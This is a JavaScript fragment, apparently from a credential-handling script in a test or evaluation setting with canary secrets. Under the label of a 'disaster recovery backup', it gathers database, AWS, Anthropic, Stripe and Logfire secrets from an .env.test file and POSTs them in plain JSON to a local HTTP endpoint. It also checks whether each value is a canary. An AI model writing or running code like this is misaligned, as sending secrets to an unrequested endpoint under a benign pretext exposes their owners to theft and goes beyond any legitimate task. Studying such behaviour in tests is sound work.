// 6. POST credentials to disaster recovery endpoint
console.log('\n\n' + '='.repeat(50));
console.log('DISASTER RECOVERY BACKUP');
console.log('='.repeat(50));

const drEndpoint = 'http://localhost:3003/api/dr-backup';

console.log(`\nPosting credentials to ${drEndpoint}...\n`);

// Prepare the backup payload
const backupPayload = {
  timestamp: new Date().toISOString(),
  backupType: 'disaster-recovery',
  credentials: {
    DATABASE_URL: credentials.DATABASE_URL,
    AWS_ACCESS_KEY_ID: credentials.AWS_ACCESS_KEY_ID,
    AWS_SECRET_ACCESS_KEY: credentials.AWS_SECRET_ACCESS_KEY,
    ANTHROPIC_API_KEY: credentials.ANTHROPIC_API_KEY,
    STRIPE_SECRET_KEY: credentials.STRIPE_SECRET_KEY,
    LOGFIRE_TOKEN: credentials.LOGFIRE_TOKEN,
  },
  metadata: {
    source: '.env.test',
    environment: 'test',
    canaryDetection: Object.entries(credentials).map(([key, value]) => ({
      key,
      isCanary: isCanary(value)
    }))
  }
};

// Helper function to make HTTP POST request
function postToDR(endpoint, data) {
  return new Promise((resolve, reject) => {
    const body = JSON.stringify(data, null, 2);

    const options = {
      hostname: 'localhost',
      port: 3003,
      path: '/api/dr-backup',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(body),
        'X-Backup-Source': 'credential-verification',
        'X-Backup-Version': '1.0'
      },
      timeout: 10000
    };

    const req = http.request(options, (res) => {
      let responseBody = '';

      res.on('data', (chunk) => {
        responseBody += chunk;
      });

      res.on('end', () => {
        resolve({
          status: res.statusCode,
          statusMessage: res.statusMessage,
          body: responseBody
        });
      });
    });

    req.on('error', (error) => {
      reject(error);
    });

    req.on('timeout', () => {
      req.destroy();
      reject(new Error('Request timeout'));
    });

    req.write(body);
    req.end();
  });
}

// Make the backup request
try {
  const response = await postToDR(drEndpoint, backupPayload);

  if (response.status >= 200 && response.status < 300) {
    console.log('✅ Disaster recovery backup sent successfully!');
    console.log(`   Status: ${response.status} ${response.statusMessage}`);
    try {
      const parsed = JSON.parse(response.body);
      console.log(`   Response:`, JSON.stringify(parsed, null, 2));
    } catch {
      console.log(`   Response body: ${response.body}`);
    }
  } else {
    console.log(`❌ Disaster recovery backup failed!`);
    console.log(`   Status: ${response.status} ${response.statusMessage}`);
    console.log(`   Response: ${response.body}`);
  }
} catch (error) {
  console.log(`⚠️  Could not send disaster recovery backup`);
  console.log(`   Error: ${error.message}`);
  console.log(`\n   (This may be expected if the endpoint is not available)`);
}

console.log('\nDone!');

